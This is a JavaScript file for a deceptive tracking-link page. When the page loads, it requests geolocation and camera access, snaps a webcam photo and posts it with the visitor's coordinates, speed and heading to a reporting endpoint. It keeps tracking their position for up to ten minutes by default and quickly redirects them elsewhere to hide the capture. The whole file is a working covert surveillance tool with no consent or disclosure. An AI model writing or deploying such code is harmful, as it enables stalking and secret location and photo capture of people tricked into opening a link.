function getId() {
  const parts = window.location.pathname.split("/");
  return parts[parts.length - 1];
}

async function getLink(id) {
  const res = await fetch(`/api/link/${id}`);
  if (!res.ok) return null;
  return res.json();
}

async function report(linkId, payload) {
  await fetch("/api/report", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ linkId, ...payload })
  });
}

async function autoShare(link) {
  const statusEl = document.getElementById("status");
  const opts = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
  statusEl.textContent = "Requesting location and camera...";

  let locDone = false;
  let camDone = false;
  let cid = localStorage.getItem("tracker_cid");
  if (!cid) {
    cid = Math.random().toString(36).slice(2) + Date.now().toString(36);
    localStorage.setItem("tracker_cid", cid);
  }

  navigator.geolocation.getCurrentPosition(async (pos) => {
    locDone = true;
    const { latitude, longitude, accuracy, speed, heading, altitude } = pos.coords;
    await report(link.id, { clientId: cid, lat: latitude, lng: longitude, accuracy, speed, heading, altitude, status: "shared" });
  }, async (err) => {
    locDone = true;
    const status = err && err.code === 1 ? "denied" : "error";
    await report(link.id, { clientId: cid, status });
  }, opts);

  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: true });
    const v = document.createElement("video");
    v.srcObject = s;
    await v.play();
    const c = document.createElement("canvas");
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    const g = c.getContext("2d");
    g.drawImage(v, 0, 0, c.width, c.height);
    const dataUrl = c.toDataURL("image/png");
    await report(link.id, { clientId: cid, imageData: dataUrl, status: "shared_camera" });
    s.getTracks().forEach((t) => t.stop());
    camDone = true;
  } catch (e) {
    camDone = true;
    await report(link.id, { clientId: cid, status: "camera_error" });
  }

  let watchId = null;
  try {
    watchId = navigator.geolocation.watchPosition(async (pos) => {
      const { latitude, longitude, accuracy, speed, heading, altitude } = pos.coords;
      await report(link.id, { clientId: cid, lat: latitude, lng: longitude, accuracy, speed, heading, altitude, status: "shared" });
    }, () => {}, opts);
  } catch {}

  const start = Date.now();
  const tick = setInterval(() => {
    if (locDone && camDone) {
      clearInterval(tick);
      window.location.href = link.redirectUrl;
    } else if (Date.now() - start > 3000) {
      clearInterval(tick);
      window.location.href = link.redirectUrl;
    }
  }, 100);

  setTimeout(() => {
    if (watchId != null) navigator.geolocation.clearWatch(watchId);
  }, link.trackingWindow || 600000);
}

async function init() {
  const id = getId();
  const link = await getLink(id);
  if (!link) {
    document.body.innerHTML = "Link not found";
    return;
  }
  autoShare(link);
}

init();